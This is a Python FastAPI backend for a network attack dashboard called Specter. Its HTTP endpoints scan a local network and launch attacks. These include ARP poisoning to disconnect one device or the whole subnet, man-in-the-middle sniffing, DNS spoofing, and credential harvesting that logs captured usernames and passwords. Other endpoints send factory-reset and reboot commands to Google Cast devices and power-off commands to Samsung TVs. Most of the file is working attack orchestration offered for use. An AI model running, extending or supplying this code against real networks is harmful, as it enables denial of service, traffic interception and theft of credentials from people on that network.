"""Specter Web Dashboard — FastAPI backend.

Provides REST API and WebSocket endpoints for the web UI.
All attack capabilities are exposed via HTTP endpoints.
"""

import asyncio
import atexit
import json
import signal
import time
import threading
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse, Response
from pydantic import BaseModel

# Persistence file
DATA_DIR = Path(__file__).parent / "data"
SCAN_FILE = DATA_DIR / "scan_results.json"

# Global state
_state = {
    "devices": [],
    "active_attacks": {},
    "logs": [],
    "mitm_sessions": {},
    "monitor": None,
    "vulnerabilities": {},  # ip -> [vuln dicts]
    "os_results": {},       # ip -> os fingerprint dict
}

# WebSocket connections for real-time updates
_ws_connections: list[WebSocket] = []


def _cleanup_attacks():
    """Emergency cleanup — restore all ARP tables on exit."""
    for attack_id, attack in list(_state["active_attacks"].items()):
        try:
            if attack.get("type") == "mitm":
                if hasattr(attack.get("sniffer"), "stop"):
                    attack["sniffer"].stop()
                if hasattr(attack.get("poisoner"), "stop"):
                    attack["poisoner"].stop()
            elif hasattr(attack.get("instance"), "stop"):
                attack["instance"].stop()
        except Exception:
            pass
    _state["active_attacks"].clear()

    # Stop monitor
    if _state.get("monitor"):
        try:
            _state["monitor"].stop()
        except Exception:
            pass


# Register cleanup for all exit scenarios
atexit.register(_cleanup_attacks)
for sig in (signal.SIGINT, signal.SIGTERM):
    try:
        signal.signal(sig, lambda s, f: (_cleanup_attacks(), signal.default_int_handler(s, f)))
    except (OSError, ValueError):
        pass


def _load_scan_results():
    """Load persisted scan results."""
    if SCAN_FILE.exists():
        try:
            data = json.loads(SCAN_FILE.read_text(encoding="utf-8"))
            _state["devices"] = data.get("devices", [])
            _state["vulnerabilities"] = data.get("vulnerabilities", {})
            _state["os_results"] = data.get("os_results", {})
        except Exception:
            pass


def _save_scan_results():
    """Persist scan results to disk."""
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    data = {
        "devices": _state["devices"],
        "vulnerabilities": _state["vulnerabilities"],
        "os_results": _state["os_results"],
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    SCAN_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")


@asynccontextmanager
async def lifespan(app: FastAPI):
    _load_scan_results()
    yield
    _cleanup_attacks()


app = FastAPI(title="Specter", version="0.2.0", lifespan=lifespan)

static_dir = Path(__file__).parent / "static"
templates_dir = Path(__file__).parent / "templates"


# --- Models ---

class ScanRequest(BaseModel):
    subnet: str | None = None
    timeout: float = 5.0
    ports: bool = False
    os_detect: bool = False
    vulns: bool = False


class KillRequest(BaseModel):
    target_ip: str
    duration: int = 0


class NukeRequest(BaseModel):
    mode: str = "all"  # "all" or "gateway"
    subnet: str | None = None


class MITMRequest(BaseModel):
    target_ip: str
    dns_spoof: bool = False
    harvest_creds: bool = False


class DNSSpoofRequest(BaseModel):
    domains: dict[str, str | None]  # domain -> redirect IP (None = block)
    mode: str = "block"


class CastRequest(BaseModel):
    target_ip: str
    action: str
    token: str = ""


class TVRequest(BaseModel):
    target_ip: str
    action: str


class MonitorRequest(BaseModel):
    interval: float = 30.0
    subnet: str | None = None


# --- Helpers ---

async def broadcast(event: str, data: Any):
    """Send event to all connected WebSocket clients."""
    msg = json.dumps({"event": event, "data": data})
    disconnected = []
    for ws in _ws_connections:
        try:
            await ws.send_text(msg)
        except Exception:
            disconnected.append(ws)
    for ws in disconnected:
        _ws_connections.remove(ws)


def add_log(level: str, message: str):
    """Add a log entry and broadcast it."""
    entry = {"time": time.strftime("%H:%M:%S"), "level": level, "message": message}
    _state["logs"].append(entry)
    if len(_state["logs"]) > 500:
        _state["logs"] = _state["logs"][-500:]
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            loop.create_task(broadcast("log", entry))
    except RuntimeError:
        pass


# --- Routes ---

@app.get("/", response_class=HTMLResponse)
async def index():
    """Serve the main dashboard."""
    html_path = templates_dir / "index.html"
    return HTMLResponse(html_path.read_text(encoding="utf-8"))


@app.get("/api/health")
async def health():
    return {"status": "ok", "version": "0.2.0"}


@app.get("/api/devices")
async def get_devices():
    """Return all discovered devices."""
    return {"devices": _state["devices"]}


@app.post("/api/scan")
async def trigger_scan(req: ScanRequest):
    """Run a network scan and return discovered devices."""
    import asyncio
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, _do_scan, req)
    _state["devices"] = result["devices"]
    _save_scan_results()
    add_log("success", f"Found {len(result['devices'])} devices")
    await broadcast("devices", result["devices"])
    return result


def _do_scan(req: ScanRequest) -> dict:
    from specter.scanner.arp import arp_scan
    from specter.scanner.mdns import MDNSScanner
    from specter.scanner.fingerprint import fingerprint_device, lookup_oui

    subnet = req.subnet
    if not subnet:
        from scapy.all import conf
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"

    add_log("info", f"Scanning {subnet}...")

    # ARP scan
    hosts = arp_scan(subnet, timeout=min(req.timeout, 3.0))

    # mDNS
    mdns = MDNSScanner()
    services = mdns.scan(duration=min(req.timeout, 3.0))
    service_map: dict[str, list[str]] = {}
    for svc in services:
        service_map.setdefault(svc.host, []).append(svc.service_type)

    # Port scan if requested (parallelized)
    port_map: dict[str, list[dict]] = {}
    if req.ports:
        from specter.scanner.ports import port_scan
        from concurrent.futures import ThreadPoolExecutor, as_completed

        def _scan_host(host):
            result = port_scan(host.ip, timeout=0.8)
            if result.open_ports:
                return host.ip, [
                    {"port": p.port, "service": p.service, "banner": p.banner[:100], "unauth": p.unauthenticated}
                    for p in result.open_ports
                ]
            return host.ip, []

        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(_scan_host, h) for h in hosts]
            for f in as_completed(futures, timeout=30):
                try:
                    ip, ports = f.result(timeout=1)
                    if ports:
                        port_map[ip] = ports
                except Exception:
                    pass

    # Resolve device names
    from specter.scanner.names import resolve_names
    host_dicts = [{"ip": h.ip, "mac": h.mac} for h in hosts]
    name_map = resolve_names(host_dicts, service_map, services)

    # Build device list
    devices = []
    for host in hosts:
        svc_list = service_map.get(host.ip, [])
        profile = fingerprint_device(host.ip, host.mac, svc_list)
        devices.append({
            "ip": host.ip,
            "mac": host.mac,
            "name": name_map.get(host.ip, ""),
            "vendor": profile.vendor,
            "device_type": profile.device_type,
            "services": [s.replace("._tcp.local.", "").replace("._udp.local.", "") for s in svc_list],
            "open_ports": port_map.get(host.ip, []),
        })

    # OS fingerprinting if requested (parallelized)
    if req.os_detect:
        from specter.scanner.os_fingerprint import fingerprint_os
        from concurrent.futures import ThreadPoolExecutor as TP2, as_completed as as_comp2

        add_log("info", "Running OS detection...")

        def _os_detect(dev):
            try:
                fp = fingerprint_os(dev["ip"])
                return dev["ip"], {"os_family": fp.os_family, "os_detail": fp.os_detail, "confidence": fp.confidence, "evidence": fp.evidence}
            except Exception:
                return dev["ip"], None

        with TP2(max_workers=6) as executor:
            futures = [executor.submit(_os_detect, d) for d in devices]
            for f in as_comp2(futures, timeout=30):
                try:
                    ip, result = f.result(timeout=1)
                    if result:
                        _state["os_results"][ip] = result
                        dev = next((d for d in devices if d["ip"] == ip), None)
                        if dev:
                            dev["os"] = result["os_family"]
                except Exception:
                    pass

    # Vulnerability scanning if requested
    if req.vulns and req.ports:
        from specter.scanner.vulns import check_vulnerabilities
        add_log("info", "Checking vulnerabilities...")
        for dev in devices:
            if dev.get("open_ports"):
                vulns = check_vulnerabilities(dev["ip"], dev["open_ports"])
                vuln_dicts = [
                    {"port": v.port, "service": v.service, "severity": v.severity,
                     "title": v.title, "description": v.description,
                     "cve": v.cve, "remediation": v.remediation}
                    for v in vulns
                ]
                _state["vulnerabilities"][dev["ip"]] = vuln_dicts
                dev["vuln_count"] = len(vulns)

    return {"devices": devices, "subnet": subnet}


@app.post("/api/portscan")
async def trigger_portscan(target_ip: str = Query(...)):
    """Port scan a specific device."""
    from specter.scanner.ports import port_scan

    add_log("info", f"Port scanning {target_ip}...")
    result = port_scan(target_ip)
    ports = [
        {"port": p.port, "service": p.service, "banner": p.banner[:100], "unauth": p.unauthenticated}
        for p in result.open_ports
    ]
    add_log("success", f"Found {len(ports)} open ports on {target_ip}")

    # Update device in state
    for dev in _state["devices"]:
        if dev["ip"] == target_ip:
            dev["open_ports"] = ports
            break

    # Auto-check vulnerabilities
    if ports:
        from specter.scanner.vulns import check_vulnerabilities
        vulns = check_vulnerabilities(target_ip, ports)
        vuln_dicts = [
            {"port": v.port, "service": v.service, "severity": v.severity,
             "title": v.title, "description": v.description,
             "cve": v.cve, "remediation": v.remediation}
            for v in vulns
        ]
        _state["vulnerabilities"][target_ip] = vuln_dicts
        if vulns:
            add_log("warning", f"Found {len(vulns)} vulnerabilities on {target_ip}")

    _save_scan_results()
    await broadcast("devices", _state["devices"])
    return {"ip": target_ip, "ports": ports, "vulnerabilities": _state["vulnerabilities"].get(target_ip, [])}


@app.post("/api/os-fingerprint")
async def os_fingerprint_device(target_ip: str = Query(...)):
    """OS fingerprint a specific device."""
    from specter.scanner.os_fingerprint import fingerprint_os

    add_log("info", f"OS fingerprinting {target_ip}...")
    fp = fingerprint_os(target_ip)
    result = {
        "os_family": fp.os_family,
        "os_detail": fp.os_detail,
        "confidence": fp.confidence,
        "evidence": fp.evidence,
    }
    _state["os_results"][target_ip] = result

    # Update device
    for dev in _state["devices"]:
        if dev["ip"] == target_ip:
            dev["os"] = fp.os_family
            break

    _save_scan_results()
    add_log("success", f"OS detected: {fp.os_family} ({fp.confidence*100:.0f}% confidence)")
    return result


@app.post("/api/kill")
async def kill_device(req: KillRequest):
    """Kill a single device's network connectivity."""
    from specter.killswitch.arp_poison import ARPPoisoner, get_gateway_ip

    gateway = get_gateway_ip()
    attack_id = f"kill_{req.target_ip}"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running", "attack_id": attack_id}

    # Find target MAC from scan results
    target_mac = None
    for dev in _state["devices"]:
        if dev["ip"] == req.target_ip:
            target_mac = dev["mac"]
            break

    poisoner = ARPPoisoner(target_ip=req.target_ip, gateway_ip=gateway, target_mac=target_mac)
    poisoner.start()

    await asyncio.sleep(0.5)
    if poisoner.error:
        add_log("error", poisoner.error)
        return {"status": "error", "message": poisoner.error}

    _state["active_attacks"][attack_id] = {
        "type": "kill",
        "target": req.target_ip,
        "started": time.time(),
        "instance": poisoner,
    }

    add_log("attack", f"KILL active on {req.target_ip}")
    await broadcast("attack_start", {"id": attack_id, "type": "kill", "target": req.target_ip})
    return {"status": "started", "attack_id": attack_id}


@app.post("/api/nuke")
async def nuke_network(req: NukeRequest):
    """Kill all network connectivity."""
    from specter.killswitch.arp_poison import NetworkKiller, get_gateway_ip
    from scapy.all import conf

    subnet = req.subnet
    if not subnet:
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"

    gateway = get_gateway_ip()
    attack_id = "nuke"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running"}

    killer = NetworkKiller(subnet=subnet, gateway_ip=gateway)

    if req.mode == "gateway":
        count = killer.kill_gateway()
        add_log("attack", f"NUKE (gateway mode) — {count} hosts affected")
    else:
        count = killer.kill_all()
        add_log("attack", f"NUKE (all) — {count} devices disconnected")

    _state["active_attacks"][attack_id] = {
        "type": "nuke",
        "mode": req.mode,
        "started": time.time(),
        "instance": killer,
    }

    await broadcast("attack_start", {"id": attack_id, "type": "nuke", "mode": req.mode, "count": count})
    return {"status": "started", "attack_id": attack_id, "count": count}


@app.post("/api/mitm")
async def start_mitm(req: MITMRequest):
    """Start MITM interception on a target."""
    import platform
    import subprocess
    from specter.killswitch.arp_poison import MITMPoisoner
    from specter.killswitch.sniffer import TrafficSniffer
    from scapy.all import conf

    gateway = conf.route.route("0.0.0.0")[2]
    attack_id = f"mitm_{req.target_ip}"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running", "attack_id": attack_id}

    # Enable IP forwarding
    if platform.system() == "Windows":
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=enabled"],
            capture_output=True,
        )

    poisoner = MITMPoisoner(target_ip=req.target_ip, gateway_ip=gateway)
    sniffer = TrafficSniffer(target_ip=req.target_ip)

    poisoner.start()
    sniffer.start()

    attack_data = {
        "type": "mitm",
        "target": req.target_ip,
        "started": time.time(),
        "poisoner": poisoner,
        "sniffer": sniffer,
        "instance": poisoner,
    }

    # Optional DNS spoofing
    if req.dns_spoof:
        from specter.killswitch.dns_spoof import DNSSpoofer
        spoofer = DNSSpoofer(mode="block")
        spoofer.start()
        attack_data["dns_spoofer"] = spoofer

    # Optional credential harvesting
    if req.harvest_creds:
        from specter.killswitch.cred_harvester import CredentialHarvester
        harvester = CredentialHarvester(target_ip=req.target_ip)
        harvester.start()
        attack_data["harvester"] = harvester

    _state["active_attacks"][attack_id] = attack_data

    # Start background task to broadcast MITM data
    def mitm_broadcast_loop():
        last_count = 0
        last_cred_count = 0
        while attack_id in _state["active_attacks"]:
            session = sniffer.session
            if session.packet_count > last_count:
                for dns in session.dns_queries[last_count:]:
                    add_log("mitm", f"DNS: {dns['query']}")
                for http in session.http_requests[last_count:]:
                    add_log("mitm", f"HTTP: {http['request']}")
                for cred in session.credentials[last_count:]:
                    add_log("cred", f"CREDENTIALS: {cred['snippet'][:80]}")
                last_count = session.packet_count

            # Credential harvester updates
            if req.harvest_creds and "harvester" in _state["active_attacks"].get(attack_id, {}):
                harvester = _state["active_attacks"][attack_id]["harvester"]
                if harvester.count > last_cred_count:
                    for c in harvester.credentials[last_cred_count:]:
                        add_log("cred", f"[{c.protocol}] {c.username}:{c.password} -> {c.dst_ip}:{c.dst_port}")
                    last_cred_count = harvester.count
            time.sleep(1)

    threading.Thread(target=mitm_broadcast_loop, daemon=True).start()

    add_log("attack", f"MITM active on {req.target_ip}" +
            (" +DNS_SPOOF" if req.dns_spoof else "") +
            (" +CRED_HARVEST" if req.harvest_creds else ""))
    await broadcast("attack_start", {"id": attack_id, "type": "mitm", "target": req.target_ip})
    return {"status": "started", "attack_id": attack_id}


@app.post("/api/dns-spoof")
async def configure_dns_spoof(req: DNSSpoofRequest):
    """Add DNS spoof entries to an active MITM attack's spoofer, or start standalone."""
    # Find active DNS spoofer
    spoofer = None
    for attack in _state["active_attacks"].values():
        if "dns_spoofer" in attack:
            spoofer = attack["dns_spoofer"]
            break

    if not spoofer:
        # Start standalone spoofer
        from specter.killswitch.dns_spoof import DNSSpoofer
        spoofer = DNSSpoofer(mode=req.mode, redirect_table=req.domains)
        spoofer.start()
        _state["active_attacks"]["dns_spoof"] = {
            "type": "dns_spoof",
            "target": "network",
            "started": time.time(),
            "instance": spoofer,
            "dns_spoofer": spoofer,
        }
        add_log("attack", f"DNS Spoofer started — {len(req.domains)} entries")
    else:
        for domain, ip in req.domains.items():
            spoofer.add_entry(domain, ip)
        add_log("info", f"Added {len(req.domains)} DNS spoof entries")

    await broadcast("attack_start", {"id": "dns_spoof", "type": "dns_spoof", "target": "network"})
    return {"status": "started", "entries": len(req.domains)}


@app.post("/api/stop/{attack_id}")
async def stop_attack(attack_id: str):
    """Stop an active attack."""
    import platform
    import subprocess

    if attack_id not in _state["active_attacks"]:
        return {"status": "not_found"}

    attack = _state["active_attacks"].pop(attack_id)

    if attack["type"] == "mitm":
        if "harvester" in attack:
            attack["harvester"].stop()
        if "dns_spoofer" in attack:
            attack["dns_spoofer"].stop()
        attack["sniffer"].stop()
        attack["poisoner"].stop()
        if platform.system() == "Windows":
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=disabled"],
                capture_output=True,
            )
    elif "dns_spoofer" in attack:
        attack["dns_spoofer"].stop()
    elif hasattr(attack.get("instance"), "stop"):
        attack["instance"].stop()

    add_log("info", f"Stopped attack: {attack_id}")
    await broadcast("attack_stop", {"id": attack_id})
    return {"status": "stopped", "attack_id": attack_id}


@app.get("/api/attacks")
async def get_attacks():
    """Get all active attacks."""
    attacks = []
    for aid, attack in _state["active_attacks"].items():
        attacks.append({
            "id": aid,
            "type": attack["type"],
            "target": attack.get("target", "network"),
            "started": attack["started"],
            "duration": time.time() - attack["started"],
        })
    return {"attacks": attacks}


@app.get("/api/logs")
async def get_logs():
    """Get recent logs."""
    return {"logs": _state["logs"][-100:]}


@app.get("/api/vulnerabilities")
async def get_vulnerabilities():
    """Get all detected vulnerabilities."""
    return {"vulnerabilities": _state["vulnerabilities"]}


@app.get("/api/os-results")
async def get_os_results():
    """Get all OS fingerprint results."""
    return {"os_results": _state["os_results"]}


# --- Monitoring ---

@app.post("/api/monitor/start")
async def start_monitor(req: MonitorRequest):
    """Start continuous network monitoring."""
    from specter.scanner.monitor import NetworkMonitor

    if _state.get("monitor"):
        return {"status": "already_running"}

    def on_event(event):
        level = "success" if event.event_type == "joined" else "warning" if event.event_type == "left" else "info"
        add_log(level, f"Device {event.event_type}: {event.ip} ({event.mac})")

    monitor = NetworkMonitor(subnet=req.subnet, interval=req.interval, on_event=on_event)
    monitor.start()
    _state["monitor"] = monitor
    add_log("info", f"Network monitor started (interval: {req.interval}s)")
    return {"status": "started", "interval": req.interval}


@app.post("/api/monitor/stop")
async def stop_monitor():
    """Stop continuous monitoring."""
    if not _state.get("monitor"):
        return {"status": "not_running"}
    _state["monitor"].stop()
    _state["monitor"] = None
    add_log("info", "Network monitor stopped")
    return {"status": "stopped"}


@app.get("/api/monitor/status")
async def monitor_status():
    """Get monitor status and events."""
    monitor = _state.get("monitor")
    if not monitor:
        return {"running": False, "events": []}
    return {
        "running": True,
        "online_count": len(monitor.get_online_devices()),
        "known_count": len(monitor.known_devices),
        "events": [
            {"timestamp": e.timestamp, "type": e.event_type, "ip": e.ip, "mac": e.mac}
            for e in monitor.events[-50:]
        ],
    }


# --- Report ---

@app.get("/api/report")
async def generate_security_report():
    """Generate and return an HTML security report."""
    from specter.web.report import generate_report
    from scapy.all import conf

    ip = conf.route.route("0.0.0.0")[1]
    subnet = f"{ip}/24"

    html = generate_report(
        devices=_state["devices"],
        vulnerabilities=_state["vulnerabilities"],
        os_results=_state["os_results"],
        subnet=subnet,
    )
    return Response(content=html, media_type="text/html")


# --- Cast & TV ---

@app.post("/api/cast")
async def cast_action(req: CastRequest):
    """Execute a Google Cast action."""
    from specter.modules.google_cast import GoogleCastModule, CastDevice

    device = CastDevice(ip=req.target_ip, local_auth_token=req.token)
    module = GoogleCastModule(device)

    try:
        match req.action:
            case "info":
                data = module.get_device_info()
                add_log("info", f"Got info from {req.target_ip}: {data.get('name', 'Unknown')}")
                return {"status": "ok", "data": data}
            case "reboot":
                result = module.reboot()
                add_log("attack", f"Reboot sent to {req.target_ip}: {'success' if result else 'failed'}")
                return {"status": "ok" if result else "failed"}
            case "reset":
                result = module.factory_reset()
                add_log("attack", f"Factory reset sent to {req.target_ip}")
                return {"status": "ok" if result else "failed"}
            case _:
                return {"status": "error", "message": f"Unknown action: {req.action}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.post("/api/tv")
async def tv_action(req: TVRequest):
    """Execute a Samsung TV action."""
    from specter.modules.samsung_tv import SamsungTVModule, SamsungTV

    device = SamsungTV(ip=req.target_ip)
    module = SamsungTVModule(device)

    match req.action:
        case "info":
            data = module.get_device_info()
            if data:
                add_log("info", f"Samsung TV info: {data.get('device', {}).get('name', 'Unknown')}")
                return {"status": "ok", "data": data}
            return {"status": "error", "message": "TV not reachable"}
        case "off":
            result = module.power_off()
            add_log("attack", f"Power off sent to TV {req.target_ip}")
            return {"status": "ok" if result else "failed"}
        case "mute":
            module.mute()
            return {"status": "ok"}
        case "volup":
            module.volume_up(5)
            return {"status": "ok"}
        case "voldown":
            module.volume_down(5)
            return {"status": "ok"}
        case _:
            return {"status": "error", "message": f"Unknown action: {req.action}"}


# --- WebSocket ---

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws.accept()
    _ws_connections.append(ws)
    try:
        while True:
            data = await ws.receive_text()
            msg = json.loads(data)
            if msg.get("type") == "ping":
                await ws.send_text(json.dumps({"event": "pong"}))
    except WebSocketDisconnect:
        _ws_connections.remove(ws)
    except Exception:
        if ws in _ws_connections:
            _ws_connections.remove(ws)
